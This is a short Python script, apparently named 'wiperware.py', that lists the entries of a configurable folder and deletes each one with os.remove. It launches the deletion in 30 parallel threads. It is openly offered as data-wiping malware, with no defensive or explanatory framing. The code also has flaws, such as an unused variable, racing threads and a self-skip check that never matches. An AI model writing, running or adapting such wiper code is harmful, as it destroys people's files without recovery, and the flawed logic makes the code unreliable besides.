import os
import threading
import getpass
from pathlib import Path

def wipe():
    name = getpass.getuser()
    ordner = Path(r"YOUR_PATH") # enter your path
    files = []

    for file in ordner.iterdir():
        if file == "wiperware.py":
            continue
        files.append(file)

    for file in files:
        os.remove(file)

threads = 30

for _ in range(threads):
    threading.Thread(target=wipe).start()



